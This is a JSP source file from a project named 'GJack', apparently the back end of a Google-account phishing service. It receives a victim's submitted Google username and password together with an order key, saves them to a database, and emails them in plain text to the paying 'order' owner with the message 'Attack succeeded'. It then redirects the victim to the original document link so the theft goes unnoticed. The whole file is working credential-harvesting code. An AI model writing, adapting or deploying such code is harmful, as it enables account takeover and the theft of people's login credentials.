<%@ page import="com.theah64.gjack.database.Orders" %>
<%@ page import="com.theah64.gjack.database.Results" %>
<%@ page import="com.theah64.gjack.model.Order" %>
<%@ page import="com.theah64.gjack.model.Result" %>
<%@ page import="com.theah64.webengine.exceptions.MailException" %>
<%@ page import="com.theah64.webengine.utils.Form" %>
<%@ page import="com.theah64.webengine.utils.MailHelper" %>
<%@ page import="com.theah64.webengine.utils.Request" %>
<%@ page import="com.theah64.webengine.utils.RequestException" %>
<%@ page import="java.sql.SQLException" %>
<%--
  Created by IntelliJ IDEA.
  User: theapache64
  Date: 27/10/17
  Time: 9:36 AM
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Redirecting...</title>
</head>
<body>
<%
    final Form form = new Form(request, new String[]{Results.COLUMN_G_USERNAME, Results.COLUMN_G_PASSWORD, Orders.COLUMN_KEY});
    try {
        if (form.isSubmitted()) {
            throw new Request.RequestException("Undefined access");
        }


        if (form.isAllRequiredParamsAvailable()) {

            final String key = form.getString(Orders.COLUMN_KEY);

            final Order order = Orders.getInstance().get(Orders.COLUMN_KEY, key);

            System.out.println("Order is : " + order);

            if (order != null) {

                final String gUsername = form.getString(Results.COLUMN_G_USERNAME);
                final String gPassword = form.getString(Results.COLUMN_G_PASSWORD);


                try {
                    Results.getInstance().add(new Result(null, order.getId(), gUsername, gPassword));

                    new Thread(new Runnable() {
                        @Override
                        public void run() {

                            //Sending mail
                            try {
                                MailHelper.sendMail(order.getUserEmail(), "GJack", String.format("Attack succeeded<br><br>Username: <b>%s</b><br>Password: <b>%s</b>", gUsername, gPassword), "GJack");
                            } catch (MailException e) {
                                e.printStackTrace();
                            }
                        }
                    }).start();

                    //Finally redirecting to original doc url
                    response.sendRedirect(order.getDocUrl());

                } catch (SQLException e) {
                    e.printStackTrace();
                    throw new Request.RequestException(e.getMessage());
                }

            } else {
                throw new Request.RequestException("Invalid order");
            }


        }
    } catch (Request.RequestException e) {
        response.sendRedirect("status.jsp?title=Error&message=" + e.getMessage());
    }
%>


</body>
</html>
